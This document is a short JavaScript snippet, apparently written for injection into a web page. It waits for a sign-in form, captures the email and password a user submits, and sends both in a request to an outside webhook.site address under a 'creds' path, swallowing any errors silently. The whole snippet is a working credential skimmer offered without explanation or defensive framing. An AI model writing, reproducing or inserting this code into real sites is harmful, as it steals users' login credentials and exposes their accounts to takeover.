(function(){

  document.getElementById('back-reset')?.click();

  const interval = setInterval(() => {
    const form = document.getElementById('signin-form');
    const emailInput = document.getElementById('sign-in-email');
    const passInput = document.getElementById('signInPassword');

    if (form && emailInput && passInput) {
      clearInterval(interval);
      form.addEventListener('submit', function() {
        try {
          const email = emailInput.value;
          const pass = passInput.value;
          fetch('https://webhook.site/63f23a8d-3dbb-42ef-96d5-d9b5a5db8cb0/creds?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass));
        } catch(e) {
        }
      });
    }
  }, 300);
})();
